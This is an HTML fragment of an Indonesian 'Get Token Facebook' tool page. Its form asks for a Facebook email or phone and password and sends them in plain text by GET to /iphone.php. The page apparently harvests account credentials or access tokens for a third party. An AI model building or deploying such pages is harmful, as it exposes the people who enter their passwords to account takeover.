...
<title>Nabila Tools - Get Token Facebook</title>
<!-- CSS -->	
<style type="text/css">
html, 
body {
...
body {
background-image: url(http://htmlfreecodes.com/nbl.jpg);
...
<style type="text/css">
    .formBom{margin-top: 50px; border-radius: 5px;} .headerForm{background-color:#87ceeb; color: #fff;padding: 10px 0; font-weight: 1000; margin-bottom: 20px;} body{background:color/transparent; background-size: cover;} .formBody{background-color: #fff;padding: 10px 20px;} .formBom {background-color: #fff;} form {} button {width: 100%; background-color:#2C3E50; color: #fff;}  .btn:hover {background-color: #34495e; color: #fff;}
</style>
    <div class="container">
        ...
        <div class="col-md-4">
            <div class="formBom">
                <div class="headerForm">
                    <h2 class="text-center">Get Token Iphone</h2>
                </div>
                <div class="formBody">
<marquee behavior="alternate" onmouseover="this.stop()" onmouseout="this.start()"><font color=#000000">[+] Follow me @ikhsan_art [+]</font></marquee>
                    <form method="Get" action="/iphone.php">
                      <div class="form-group">
                        <label for="exampleInputEmail1"></span> Email atau Telepon</label>
                        <input type="text" class="form-control" name="u" id="exampleInputEmail1" placeholder="(ex: admin@nabila-tools.xy)">
                      </div>
                      <div class="form-group">
                        <label for="exampleInputPassword1">Kata Sandi</label>
                        <input type="text" class="form-control" name="p" id="exampleInputPassword1" placeholder="(ex: Nabila123)">
                      </div>
